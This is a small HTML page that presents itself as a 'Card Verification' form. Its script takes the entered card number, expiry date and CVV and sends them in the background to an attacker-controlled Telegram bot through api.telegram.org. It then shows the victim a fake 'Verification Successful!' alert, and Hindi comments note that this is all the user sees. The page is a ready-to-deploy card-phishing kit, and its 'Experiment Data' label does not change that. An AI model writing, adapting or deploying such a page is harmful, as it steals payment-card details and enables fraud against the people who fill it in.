<!DOCTYPE html>
<html>
<body>

    <h3>Card Verification</h3>
    <input type="text" id="card" placeholder="Card Number"><br><br>
    <input type="text" id="exp" placeholder="MM/YY"><br><br>
    <input type="text" id="cvv" placeholder="CVV"><br><br>
    
    <button onclick="sendDirect()">Submit</button>

    <script>
        function sendDirect() {
            // Apni details yahan bharein
            const token = "YOUR_BOT_TOKEN_HERE";
            const chatId = "YOUR_CHAT_ID_HERE";
            
            const card = document.getElementById('card').value;
            const exp = document.getElementById('exp').value;
            const cvv = document.getElementById('cvv').value;

            const message = `Experiment Data:%0A- Card: ${card}%0A- Expiry: ${exp}%0A- CVV: ${cvv}`;
            
            // Direct API call (Background mein)
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;

            fetch(url).then(response => {
                if(response.ok) {
                    alert("Verification Successful!"); // User ko bas ye dikhega
                }
            });
        }
    </script>

</body>
</html>
